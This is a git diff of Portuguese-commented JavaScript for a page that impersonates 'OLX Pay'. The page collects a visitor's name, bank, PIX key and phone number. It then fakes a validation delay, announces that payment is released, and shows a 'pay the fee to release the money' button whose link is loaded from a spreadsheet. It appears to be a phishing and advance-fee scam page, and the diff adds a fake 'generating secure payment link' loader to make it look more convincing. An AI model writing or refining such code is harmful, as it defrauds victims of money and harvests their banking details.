@@ -32,7 +32,7 @@ const mainContainer = document.getElementById('main-container');
 
 // --- Função de Renderização Principal ---
 function renderContainer(dadosBrutos) {
-  // Normaliza os dados para minúsculo (evita erro se na planilha estiver "Link" ou "link")
+  // Normaliza os dados para minúsculo
   const dados = {};
   Object.keys(dadosBrutos).forEach(key => {
     dados[key.toLowerCase()] = dadosBrutos[key];
@@ -50,9 +50,7 @@ function renderContainer(dadosBrutos) {
   const taxa = dados.taxa || 'R$ --';
   const prazo = dados.prazo || '15 minutos';
   
-  // --- LÓGICA DO LINK DINÂMICO ---
-  // Pega o link que veio do Admin/Planilha. Se estiver vazio, coloca um # para não quebrar.
-  // O script tenta ler variações comuns de nome de coluna.
+  // Link dinâmico vindo da planilha
   const linkFinal = dados.linkpagamento || dados['link pagamento'] || dados['checkout'] || '#';
 
   content.innerHTML = `
@@ -80,7 +78,7 @@ function renderContainer(dadosBrutos) {
     </ul>
   `;
 
-  // Formulário
+  // --- 1. CRIAÇÃO DO FORMULÁRIO ---
   const form = criarElemento('form', { id: 'dadosCliente' });
   const campos = ['nome', 'banco', 'pix', 'telefone'];
   
@@ -95,52 +93,78 @@ function renderContainer(dadosBrutos) {
   form.append(btnEnviar, msgEnvio);
   content.appendChild(form);
 
-  // Botão de Pagamento (Link vindo da Planilha)
+  // --- 2. CRIAÇÃO DO LOADER INTERMEDIÁRIO ---
+  // Este loader ficará visível APENAS enquanto o botão verde está "nascendo" (transição CSS)
+  const loaderDiv = document.createElement('div');
+  loaderDiv.id = 'loader-intermedio'; // Importante: Deve ter CSS correspondente
+  loaderDiv.innerHTML = `
+    <i class="fa-solid fa-circle-notch fa-spin"></i>
+    <p>Gerando link de pagamento seguro...</p>
+  `;
+  content.appendChild(loaderDiv);
+
+  // --- 3. CRIAÇÃO DO BOTÃO DE PAGAMENTO (Oculto) ---
   const btnPagamento = criarElemento('a', { 
     id: 'btn-pagamento', 
     class: 'button hidden', 
-    href: linkFinal // Usa a variável dinâmica
+    href: linkFinal 
   }, 'Pagar Taxa e Liberar Valor');
   
   const btnContainer = criarElemento('div', { class: 'button-container' }, btnPagamento);
   content.appendChild(btnContainer);
 
-  // Montagem Final
+  // Montagem final do HTML
   container.append(imgHeader, title, content);
   const footer = criarElemento('div', { class: 'footer' }, '&copy; 2025 OLX Pay. Todos os direitos reservados.');
   container.appendChild(footer);
   mainContainer.appendChild(container);
 
-  // --- LÓGICA DO SUBMIT COM ANIMAÇÃO ---
+  // --- 4. LÓGICA DE ENVIO E ANIMAÇÃO ---
   form.addEventListener('submit', (e) => {
     e.preventDefault();
     
-    // 1. Feedback Visual
+    // Feedback imediato no botão de envio
     btnEnviar.innerHTML = `<div class="btn-loading-content"><i class="fa-solid fa-circle-notch fa-spin"></i> Validando chave PIX...</div>`;
     btnEnviar.disabled = true;
     btnEnviar.style.background = "#555";
-    btnEnviar.style.color = "#fff";
 
-    // 2. Simulação de Processamento (2 segundos)
+    // Simula tempo de processamento (1.5s)
     setTimeout(() => {
-      // Mensagem de Sucesso
+      // A. Feedback de Sucesso
       msgEnvio.textContent = "✅ Dados validados! Pagamento liberado.";
       msgEnvio.style.color = "#00bfa5";
       msgEnvio.style.fontWeight = "bold";
 
-      // Esconde Form e Mostra Botão
-      form.style.display = 'none'; 
-      
+      // B. Troca de Cena: Sai Form -> Entra Loader Intermediário
+      form.style.display = 'none';
+      loaderDiv.style.display = 'block'; // Mostra o loader temporário
+
+      // C. Inicia a entrada do Botão Verde
       btnPagamento.classList.remove('hidden');
       btnPagamento.classList.add('visible');
-      btnPagamento.style.display = 'inline-block'; 
-      
-      // Scroll suave
-      btnPagamento.scrollIntoView({ behavior: 'smooth', block: 'center' });
+      btnPagamento.style.display = 'inline-block';
 
-    }, 2000);
+      // D. LÓGICA INTELIGENTE:
+      // Espera a animação CSS do botão terminar para esconder o loader
+      function finalizarAnimacao(event) {
+        // Verifica se a transição que acabou foi a de opacidade ou transform
+        if (event.propertyName === 'opacity' || event.propertyName === 'transform') {
+           loaderDiv.style.display = 'none'; // Remove o loader intermediário
+           btnPagamento.removeEventListener('transitionend', finalizarAnimacao); // Limpa memória
+        }
+      }
+
+      // Adiciona o "ouvidor" de evento ao botão
+      btnPagamento.addEventListener('transitionend', finalizarAnimacao);
+
+      // Garante scroll suave para o usuário ver a ação
+      btnContainer.scrollIntoView({ behavior: 'smooth', block: 'center' });
+
+    }, 1500);
   });
 }
+
+// --- Funções Auxiliares ---
 
 function renderError(msg) {
   mainContainer.innerHTML = `
